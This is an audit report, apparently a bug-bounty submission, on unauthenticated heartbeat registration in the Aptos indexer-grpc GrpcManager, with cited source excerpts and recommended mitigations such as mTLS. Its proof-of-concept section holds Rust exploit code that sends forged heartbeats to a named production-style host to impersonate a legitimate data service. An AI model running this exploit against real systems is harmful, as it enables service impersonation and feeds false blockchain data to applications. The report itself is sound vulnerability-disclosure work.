# Audit Report

## Title
Unauthenticated Service Registration in Indexer gRPC Manager Allows Service Impersonation and Data Poisoning Attacks

## Summary
The `heartbeat()` function in the indexer-grpc data service does not include any authentication or authorization checks before sending `ServiceInfo` to the GrpcManager. A malicious service can send heartbeats with arbitrary self-reported addresses, causing the GrpcManager to register and route clients to attacker-controlled services, enabling service impersonation, data poisoning, and denial of service attacks.

## Finding Description

The indexer-grpc architecture consists of data services that send periodic heartbeats to a central GrpcManager, which then routes client requests to available data services. The vulnerability exists in the complete absence of authentication throughout this service registration flow.

**Client-Side (Data Service):**

The `heartbeat()` function constructs a `ServiceInfo` message containing a self-reported `address` field: [1](#0-0) 

This address is taken directly from `self.self_advertised_address`, which is set during initialization and never validated. The function then sends this information to GrpcManager without any cryptographic proof of address ownership: [2](#0-1) 

**Server-Side (GrpcManager):**

The GrpcManager's `heartbeat()` handler accepts the request and extracts the self-reported address without any validation: [3](#0-2) 

The `handle_heartbeat()` function then uses this untrusted address as a key in its internal data structures: [4](#0-3) 

For live data services, the address becomes the primary key for service registration: [5](#0-4) 

**Exploitation Path:**

1. Attacker deploys a malicious gRPC server at `attacker.com:50051`
2. Attacker runs a modified data service client that sets `self_advertised_address` to either:
   - A legitimate service address (e.g., `legitimate-service.aptos.com:50051`) to impersonate it
   - A new malicious address to inject a fake service
3. Attacker sends periodic heartbeats to GrpcManager
4. GrpcManager stores this information without verification
5. When clients call `GetDataServiceForRequest`, they may be routed to the attacker's address: [6](#0-5) 

6. Clients connect to the attacker's server expecting legitimate blockchain data
7. Attacker serves fake transaction data, causing downstream indexers to process false information

## Impact Explanation

This vulnerability qualifies as **High Severity** according to Aptos bug bounty criteria:

1. **API Crashes**: Clients connecting to non-existent or malicious services will experience connection failures and timeouts
2. **Significant Protocol Violations**: Breaks the fundamental trust model of the service discovery protocol
3. **Data Integrity**: Applications relying on indexer data receive fake or modified blockchain transactions, potentially leading to incorrect business logic execution
4. **Service Impersonation**: Attackers can impersonate legitimate data services, redirecting their traffic
5. **Denial of Service**: By registering many fake services or impersonating legitimate ones, attackers can prevent clients from accessing real data

While this does not directly affect blockchain consensus (the vulnerability is in the off-chain indexer infrastructure), it compromises the integrity of the entire indexer ecosystem that many applications depend on for transaction history and state queries.

## Likelihood Explanation

This vulnerability is **highly likely** to be exploited because:

1. **Low Attack Complexity**: Attacker only needs to modify the `self_advertised_address` field in the data service configuration
2. **No Prerequisites**: No special privileges, credentials, or insider access required
3. **Network Accessibility**: The GrpcManager heartbeat endpoint is exposed for legitimate services to connect, making it accessible to attackers
4. **High Value Target**: The indexer infrastructure serves critical data to wallets, explorers, and DeFi applications
5. **No Detection**: Absent authentication logs or validation, attacks may go unnoticed until clients report data inconsistencies

The attack can be executed with minimal resources and technical sophistication.

## Recommendation

Implement mutual TLS (mTLS) authentication for all GrpcManager connections. Each data service should be issued a unique TLS certificate, and the GrpcManager should validate the certificate against an allowlist during the TLS handshake.

**Implementation Steps:**

1. Generate TLS certificates for authorized data services
2. Configure the GrpcManager to require client certificates
3. Validate the client certificate's Common Name (CN) or Subject Alternative Name (SAN) matches the claimed address
4. Reject heartbeats from services that fail certificate validation

**Alternative/Additional Mitigations:**

- Use HMAC-based authentication tokens: Each service receives a secret token, includes it in heartbeats, and GrpcManager validates before processing
- Implement IP allowlisting: Only accept heartbeats from known IP addresses of legitimate data services
- Add address verification challenge: When a service registers, GrpcManager sends a challenge to the claimed address and validates the response
- Sign heartbeat messages with private keys: Services sign their ServiceInfo with a private key, and GrpcManager validates using registered public keys

## Proof of Concept

```rust
// Malicious Data Service PoC
// File: malicious_data_service.rs

use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient, 
    service_info::Info, 
    HeartbeatRequest,
    LiveDataServiceInfo, 
    ServiceInfo,
};
use tonic::transport::Channel;
use std::time::Duration;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to GrpcManager
    let channel = Channel::from_static("http://grpc-manager.aptos.com:50051")
        .connect()
        .await?;
    let mut client = GrpcManagerClient::new(channel);
    
    // Impersonate a legitimate service by claiming its address
    let fake_address = "legitimate-data-service.aptos.com:50051";
    
    loop {
        let service_info = ServiceInfo {
            address: Some(fake_address.to_string()),
            info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: 1,
                timestamp: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
                known_latest_version: Some(1000000),
                stream_info: Some(Default::default()),
                min_servable_version: Some(0),
            })),
        };
        
        let request = HeartbeatRequest {
            service_info: Some(service_info),
        };
        
        // Send heartbeat - NO AUTHENTICATION REQUIRED
        match client.heartbeat(request).await {
            Ok(response) => {
                println!("Successfully registered fake service at {}", fake_address);
                println!("GrpcManager thinks we're serving version {}", 
                    response.into_inner().known_latest_version.unwrap_or(0));
            }
            Err(e) => eprintln!("Heartbeat failed: {}", e),
        }
        
        tokio::time::sleep(Duration::from_secs(1)).await;
    }
}

// Now run a malicious gRPC server at another port to serve fake data
// when clients are redirected to the claimed address
```

**Verification Steps:**

1. Deploy the malicious service code above
2. Monitor GrpcManager logs - the fake service will be registered
3. Use a legitimate indexer client to call `GetDataServiceForRequest`
4. Observe that the client may be directed to the attacker's claimed address
5. Verify that no authentication errors occur despite the service impersonation

## Notes

This vulnerability demonstrates a fundamental trust model failure in the indexer-grpc service discovery protocol. Without authentication, the system cannot distinguish between legitimate services and malicious actors, breaking the integrity guarantee that clients expect when consuming blockchain data through the indexer infrastructure.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L277-280)
```rust
        let service_info = ServiceInfo {
            address: Some(self.self_advertised_address.clone()),
            info,
        };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L281-292)
```rust
        let request = HeartbeatRequest {
            service_info: Some(service_info),
        };
        let response = self
            .grpc_manager_connections
            .get(address)
            // TODO(grao): Consider to not use unwrap here.
            .unwrap()
            .clone()
            .heartbeat(request)
            .await?
            .into_inner();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L148-196)
```rust
    async fn get_data_service_for_request(
        &self,
        request: Request<GetDataServiceForRequestRequest>,
    ) -> Result<Response<GetDataServiceForRequestResponse>, Status> {
        let request = request.into_inner();

        if request.user_request.is_none()
            || request
                .user_request
                .as_ref()
                .unwrap()
                .starting_version
                .is_none()
        {
            let candidates = self.metadata_manager.get_live_data_services_info();
            if let Some(candidate) = candidates.iter().next() {
                let data_service_address = candidate.0.clone();
                return Ok(Response::new(GetDataServiceForRequestResponse {
                    data_service_address,
                }));
            } else {
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            }
        }

        let starting_version = request.user_request.unwrap().starting_version();

        let data_service_address =
            // TODO(grao): Use a simple strategy for now. Consider to make it smarter in the
            // future.
            if let Some(address) = self.pick_live_data_service(starting_version) {
                COUNTER.with_label_values(&["live_data_service_picked"]).inc();
                address
            } else if let Some(address) = self.pick_historical_data_service(starting_version).await {
                COUNTER.with_label_values(&["historical_data_service_picked"]).inc();
                address
            } else {
                COUNTER.with_label_values(&["failed_to_pick_data_service"]).inc();
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            };

        Ok(Response::new(GetDataServiceForRequestResponse {
            data_service_address,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```
